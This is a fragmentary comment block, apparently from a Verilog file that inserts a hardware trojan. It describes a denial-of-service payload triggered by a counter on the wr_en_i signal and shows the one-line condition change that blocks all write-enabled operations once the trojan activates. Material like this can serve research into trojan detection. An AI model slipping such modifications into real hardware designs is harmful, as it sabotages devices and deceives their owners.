 ...
 * 
 * Description:
 *   Disables operations by blocking wr_en_i control signal
 *   
 * Trigger: Counter on wr_en_i
 * Payload: Block wr_en_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block wr_en_i when trojan is active
//
// IMPORTANT: wr_en_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (wr_en_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: wr_en_i && 0 = 0 (always false)
//   All operations controlled by wr_en_i are blocked
